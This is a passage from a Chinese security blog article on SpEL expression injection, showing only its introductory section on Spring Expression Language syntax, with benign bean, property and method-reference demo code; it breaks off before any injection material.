#  SpEL表达式注入漏洞总结   
Mi1k7ea  猪猪谈安全   2024-09-05 21:00  
  
```
原文于：http://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#0x02-SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
原文作者：Mi1k7ea
```  
## 0x01 SpEL表达式基础  
### SpEL简介  
  
在Spring 3中引入了Spring表达式语言（Spring Expression Language，简称SpEL），这是一种功能强大的表达式语言，支持在运行时查询和操作对象图，可以与基于XML和基于注解的Spring配置还有bean定义一起使用。  
  
在Spring系列产品中，SpEL是表达式计算的基础，实现了与Spring生态系统所有产品无缝对接。Spring框架的核心功能之一就是通过依赖注入的方式来管理Bean之间的依赖关系，而SpEL可以方便快捷的对ApplicationContext中的Bean进行属性的装配和提取。由于它能够在运行时动态分配值，因此可以为我们节省大量Java代码。  
  
SpEL有许多特性：  
- 使用Bean的ID来引用Bean  
  
- 可调用方法和访问对象的属性  
  
- 可对值进行算数、关系和逻辑运算  
  
- 可使用正则表达式进行匹配  
  
- 可进行集合操作  
  
### SpEL定界符——#{}  
  
SpEL使用#{}作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等。  
  
这里需要注意#{}和${}的区别：  
- #{}就是SpEL的定界符，用于指明内容未SpEL表达式并执行；  
  
- ${}主要用于加载外部属性文件中的值；  
  
- 两者可以混合使用，但是必须#{}在外面，${}在里面，如#{'${}'}，注意单引号是字符串类型才添加的；  
  
### SpEL表达式类型  
#### 字面值  
  
最简单的SpEL表达式就是仅包含一个字面值。  
  
下面我们在XML配置文件中使用SpEL设置类属性的值为字面值，此时需要用到#{}定界符，注意若是指定为字符串的话需要添加单引号括起来：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;message1&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{666}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;message2&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{&#39;mi1k7ea&#39;}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
还可以直接与字符串混用：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&lt;property name=&#34;message&#34; value=&#34;the value is #{666}&#34;/&gt;</span><br/></pre></td></tr></tbody></table>  
Java基本数据类型都可以出现在SpEL表达式中，表达式中的数字也可以使用科学计数法：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;salary&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{1e4}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>##### Demo  
  
直接用Spring的HelloWorld例子。  
  
HelloWorld.java：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> HelloWorld </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> String message;</span><br/><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> setMessage(String message)</span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">this</span>.message  = message;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> getMessage()</span>{</span><br/><span style="height: 20px;line-height: 20px;">        System.out.println(<span style="color: rgb(26, 188, 156);">&#34;Your Message : &#34;</span> + message);</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
MainApp.java：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> com.mi1k7ea.service.AccountService;</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.context.ApplicationContext;</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> MainApp </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">static</span> <span style="color: rgb(0, 146, 219);">void</span> main(String[] args) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        ApplicationContext context = <span style="color: rgb(233, 105, 0);">new</span> ClassPathXmlApplicationContext(<span style="color: rgb(26, 188, 156);">&#34;Beans.xml&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">        HelloWorld obj = (HelloWorld) context.getBean(<span style="color: rgb(26, 188, 156);">&#34;helloWorld&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">        obj.getMessage();</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
Beans.xml：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">beans</span> xmlns=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xmlns:xsi=<span style="color: rgb(26, 188, 156);">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xsi:schemaLocation=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);"><span style="color: rgb(26, 188, 156);">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd &#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;helloWorld&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.HelloWorld&#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;message&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{&#39;mi1k7ea&#39;} is #{666}&#34;</span> /&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">bean</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">beans</span>&gt;</span></span><br/></pre></td></tr></tbody></table>  
运行输出：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">Your Message : mi1k7ea is 666</span><br/></pre></td></tr></tbody></table>#### 引用Bean、属性和方法  
##### 引用Bean  
  
SpEL表达式能够通过其他Bean的ID进行引用，直接在#{}符号中写入ID名即可，无需添加单引号括起来。如：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">&lt;!--原来的写法，通过构造函数实现依赖注入--&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(179, 179, 179);">&lt;!--&lt;constructor-arg ref=&#34;test&#34;/&gt;--&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">constructor-arg</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{test}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>##### 引用类属性  
> SpEL表达式能够访问类的属性。  
> 比如，carl参赛者是一位模仿高手，kenny唱什么歌，弹奏什么乐器，他就唱什么歌，弹奏什么乐器：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt;<span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;kenny&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.spring.entity.Instrumentalist&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&gt;</span>    p:song=&#34;May Rain&#34;</span><br/><span style="height: 20px;line-height: 20px;">&gt;    p:instrument-ref=&#34;piano&#34;/&gt;</span><br/><span style="height: 20px;line-height: 20px;">&gt;<span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;carl&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.spring.entity.Instrumentalist&#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;    <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;instrument&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{kenny.instrument}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;    <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;song&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{kenny.song}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;<span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">bean</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> key指定kenny<bean> 的id，value指定kenny<bean>的song属性。其等价于执行下面的代码：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt;Instrumentalist carl = new Instrumentalist();</span><br/><span style="height: 20px;line-height: 20px;">&gt;carl.setSong(kenny.getSong());</span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
##### 引用类方法  
> SpEL表达式还可以访问类的方法。  
> 假设现在有个SongSelector类，该类有个selectSong()方法，这样的话carl就可以不用模仿别人，开始唱songSelector所选的歌了：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;song&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{SongSelector.selectSong()}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> carl有个癖好，歌曲名不是大写的他就浑身难受，我们现在要做的就是仅仅对返回的歌曲调用toUpperCase()方法：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;song&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{SongSelector.selectSong().toUpperCase()}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> 注意：这里我们不能确保不抛出NullPointerException，为了避免这个讨厌的问题，我们可以使用SpEL的null-safe存取器  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;song&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{SongSelector.selectSong()?.toUpperCase()}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> ?.符号会确保左边的表达式不会为null，如果为null的话就不会调用toUpperCase()方法了。  
  
##### Demo——引用Bean  
  
这里我们修改基于构造函数的依赖注入的示例。  
  
SpellChecker.java：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> SpellChecker </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> SpellChecker()</span>{</span><br/><span style="height: 20px;line-height: 20px;">        System.out.println(<span style="color: rgb(26, 188, 156);">&#34;Inside SpellChecker constructor.&#34;</span> );</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> checkSpelling() </span>{</span><br/><span style="height: 20px;line-height: 20px;">        System.out.println(<span style="color: rgb(26, 188, 156);">&#34;Inside checkSpelling.&#34;</span> );</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
TextEditor.java：  
  
